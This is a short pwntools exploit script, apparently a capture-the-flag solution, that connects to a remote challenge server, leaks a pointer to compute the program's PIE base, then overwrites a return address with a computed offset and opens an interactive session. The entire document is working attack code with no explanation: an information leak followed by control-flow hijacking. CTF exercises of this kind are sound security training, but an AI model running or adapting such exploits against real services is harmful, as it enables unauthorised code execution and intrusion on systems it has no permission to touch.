from pwn import *

context.arch = "amd64"
y = remote('edu-ctf.csie.org', 10177)


y.sendafter('Size of your message: ', str(0x10))
y.sendafter('Message: ', 'a'*8)
y.recvuntil('a'*8)

leak = u64(y.recv(6) + '\0\0')
pie_base = leak - 0xa77
info( 'pie -> %s' % hex( pie_base ) )

y.sendafter( 'Size of your message: ', str(0x10))
y.sendafter( 'Message: ', 'a'*8 + p64( pie_base + 0xab5))
y.interactive()